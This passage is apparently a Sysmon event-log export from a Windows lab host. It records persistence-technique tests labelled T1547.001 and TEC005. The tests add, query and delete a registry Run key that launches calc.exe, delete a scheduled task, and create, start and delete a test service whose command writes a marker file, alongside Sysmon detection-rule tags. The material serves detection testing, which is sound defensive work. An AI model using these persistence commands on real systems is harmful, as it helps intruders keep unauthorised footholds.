 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:53.1118154Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:28.118"",
 ""ProcessGuid"": ""{6bc49a7d-8ce0-6a53-8505-000000009a01}"",
 ""ProcessId"": 10808,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:53.1369585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:28.140"",
 ""ProcessGuid"": ""{6bc49a7d-8ce0-6a53-8605-000000009a01}"",
 ""ProcessId"": 2820,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ce0-6a53-8505-000000009a01}"",
 ""ParentProcessId"": ""10808"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:03.5791966Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:41.535"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8705-000000009a01}"",
 ""ProcessId"": 4928,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:03.6191115Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:41.578"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8805-000000009a01}"",
 ""ProcessId"": 8288,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ced-6a53-8705-000000009a01}"",
 ""ParentProcessId"": ""4928"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:03.6350985Z,"{
 ""RuleName"": ""T1060,RunKey"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:47:41.608"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8805-000000009a01}"",
 ""ProcessId"": 8288,
 ""Image"": ""C:\\Windows\\system32\\reg.exe"",
 ""TargetObject"": ""HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test"",
 ""Details"": ""C:\\Windows\\System32\\calc.exe"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:05.7128488Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:44.465"",
 ""ProcessGuid"": ""{6bc49a7d-8cf0-6a53-8905-000000009a01}"",
 ""ProcessId"": 3204,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:05.7423727Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:44.500"",
 ""ProcessGuid"": ""{6bc49a7d-8cf0-6a53-8a05-000000009a01}"",
 ""ProcessId"": 7312,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cf0-6a53-8905-000000009a01}"",
 ""ParentProcessId"": ""3204"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:07.8490381Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:47.509"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8b05-000000009a01}"",
 ""ProcessId"": 11496,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:07.8758861Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:47.541"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8c05-000000009a01}"",
 ""ProcessId"": 12268,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cf3-6a53-8b05-000000009a01}"",
 ""ParentProcessId"": ""11496"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,12,2026-07-12T12:48:07.8913467Z,"{
 ""RuleName"": ""T1060,RunKey"",
 ""EventType"": ""DeleteValue"",
 ""UtcTime"": ""2026-07-12 12:47:47.562"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8c05-000000009a01}"",
 ""ProcessId"": 12268,
 ""Image"": ""C:\\Windows\\system32\\reg.exe"",
 ""TargetObject"": ""HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:18.2652994Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:02.650"",
 ""ProcessGuid"": ""{6bc49a7d-8d02-6a53-8d05-000000009a01}"",
 ""ProcessId"": 5764,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:18.3072862Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:02.694"",
 ""ProcessGuid"": ""{6bc49a7d-8d02-6a53-8e05-000000009a01}"",
 ""ProcessId"": 2808,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d02-6a53-8d05-000000009a01}"",
 ""ParentProcessId"": ""5764"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:18.3233873Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:02.734"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\Start"",
 ""Details"": ""DWORD (0x00000003)"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:18.3236004Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:02.734"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\ImagePath"",
 ""Details"": ""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:20.3835585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:05.828"",
 ""ProcessGuid"": ""{6bc49a7d-8d05-6a53-8f05-000000009a01}"",
 ""ProcessId"": 4100,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe qc \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:20.4048053Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:05.858"",
 ""ProcessGuid"": ""{6bc49a7d-8d05-6a53-9005-000000009a01}"",
 ""ProcessId"": 8908,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  qc \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d05-6a53-8f05-000000009a01}"",
 ""ParentProcessId"": ""4100"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe qc \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.4916581Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:08.991"",
 ""ProcessGuid"": ""{6bc49a7d-8d08-6a53-9105-000000009a01}"",
 ""ProcessId"": 11712,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe start \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.5219516Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:09.032"",
 ""ProcessGuid"": ""{6bc49a7d-8d09-6a53-9205-000000009a01}"",
 ""ProcessId"": 9132,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  start \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d08-6a53-9105-000000009a01}"",
 ""ParentProcessId"": ""11712"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe start \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.5366429Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:09.056"",
 ""ProcessGuid"": ""{6bc49a7d-8d09-6a53-9305-000000009a01}"",
 ""ProcessId"": 1480,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""NT AUTHORITY\\SYSTEM"",
 ""LogonGuid"": ""{6bc49a7d-7991-6a53-e703-000000000000}"",
 ""LogonId"": ""0x3E7"",
 ""TerminalSessionId"": ""0"",
 ""IntegrityLevel"": ""System"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ParentProcessId"": ""772"",
 ""ParentImage"": ""C:\\Windows\\System32\\services.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\services.exe"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:24.624423Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:12.190"",
 ""ProcessGuid"": ""{6bc49a7d-8d0c-6a53-9405-000000009a01}"",
 ""ProcessId"": 11680,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
